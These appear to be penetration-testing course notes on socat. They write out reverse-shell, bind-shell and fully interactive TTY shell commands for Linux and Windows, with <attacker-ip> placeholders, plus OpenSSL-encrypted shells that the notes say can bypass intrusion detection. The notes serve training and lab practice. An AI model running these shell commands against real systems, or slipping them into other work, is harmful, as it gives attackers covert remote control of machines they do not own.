# Socat

Socat is similar to Netcat but fundamentally different in many ways. It acts as a connector between two points, which could be a listening port and the keyboard, a listening port and a file, or even two listening ports. Think of it as a "portal gun" for networking!

#### Reverse Shells

*   The syntax for Socat is more complex than that of Netcat. Here’s the syntax for a basic reverse shell listener in Socat:

    ```bash
    socat TCP-L:<port> -
    ```

    * This command connects a listening port to standard input, resulting in an unstable shell. It works on both Linux and Windows and is equivalent to `nc -lvnp <port>`.
*   **Connecting Back on Windows**:

    ```bash
    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
    ```

    * The "pipes" option forces PowerShell (or cmd.exe) to use Unix-style standard input and output.
*   **Connecting Back on Linux**:

    ```bash
    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
    ```

#### Bind Shells

*   **Listener on Linux**:

    ```bash
    socat TCP-L:<PORT> EXEC:"bash -li"
    ```
*   **Listener on Windows**:

    ```bash
    socat TCP-L:<PORT> EXEC:powershell.exe,pipes
    ```
*   Regardless of the target, use the following command on your attacking machine to connect to the waiting listener:

    ```bash
    socat TCP:<TARGET-IP>:<TARGET-PORT> -
    ```

#### Fully Stable Linux TTY Reverse Shell

*   Socat can be used to create a fully stable Linux TTY reverse shell, which is significantly more stable than a standard shell. Here’s the listener syntax:

    ```bash
    socat TCP-L:<port> FILE:`tty`,raw,echo=0
    ```

    * This command connects a listening port to the current TTY as a file, setting echo to zero. This is similar to the `Ctrl + Z, stty raw -echo; fg` trick with a Netcat shell but provides immediate stability.
* To activate this special listener, the target must have Socat installed. If it’s not installed, you can upload a precompiled Socat binary.
*   **Special Command for Interactive Shell**:

    {% code overflow="wrap" %}
    ```bash
    socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
    ```
    {% endcode %}

    * **Breakdown of Arguments**:
      * **pty**: Allocates a pseudoterminal on the target, part of the stabilization process.
      * **stderr**: Ensures error messages are shown in the shell.
      * **sigint**: Passes Ctrl + C commands through to the subprocess, allowing command termination.
      * **setsid**: Creates the process in a new session.
      * **sane**: Stabilizes the terminal, normalizing it.

#### Practical Application

* In practice, you would have a listener running on your attacking machine while executing the special Socat command on the compromised target. This results in a fully interactive bash shell on the Socat listener.
* The Socat shell allows for interactive commands, such as SSH, and can be further improved by setting the `stty` values to enable text editors like Vim or Nano.

#### Troubleshooting

* If a Socat shell is not functioning correctly, increase verbosity by adding `-d -d` to the command. This is useful for experimental purposes but is generally not necessary for regular use.

***

### Socat Encrypted Shells

Socat can create encrypted shells (both bind and reverse), which are beneficial because they cannot be easily monitored without the decryption key and can often bypass Intrusion Detection Systems (IDS).

#### Setting Up Encrypted Shells

* To create encrypted shells, replace any instance of TCP in the command syntax with OPENSSL.
*   Before using encrypted shells, you need to generate a certificate on your attacking machine:

    {% code overflow="wrap" %}
    ```bash
    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
    ```
    {% endcode %}

    * This command creates a 2048-bit RSA key and a matching self-signed certificate valid for just under a year. You can leave the certificate information blank or fill it in randomly.
*   Merge the generated key and certificate into a single PEM file:

    ```bash
    cat shell.key shell.crt > shell.pem
    ```

#### Setting Up the Listener

*   For a reverse shell listener, use the following command:

    <pre class="language-bash"><code class="lang-bash"><strong>socat OPENSSL-LISTEN:&#x3C;PORT>,cert=shell.pem,verify=0 -
    </strong></code></pre>

    * This sets up an OPENSSL listener using the generated certificate. The `verify=0` option disables validation of the certificate by a recognized authority. Remember, the certificate must be used on the device that is listening.

#### Connecting Back

*   To connect back to the listener, use:

    ```bash
    socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
    ```

#### Bind Shells

*   For a bind shell on a target, use:

    {% code overflow="wrap" %}
    ```bash
    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
    ```
    {% endcode %}
*   On the attacking machine, connect with:

    ```bash
    socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
    ```
* Note: The certificate must be used with the listener, so ensure the PEM file is copied over for a bind shell.

#### Practical Application

* The technique can also be applied to the special Linux-only TTY shell discussed in the previous task. Experimenting with the syntax may be necessary, and you can use the Linux Practice box (available at the end of the room) for hands-on practice if needed.
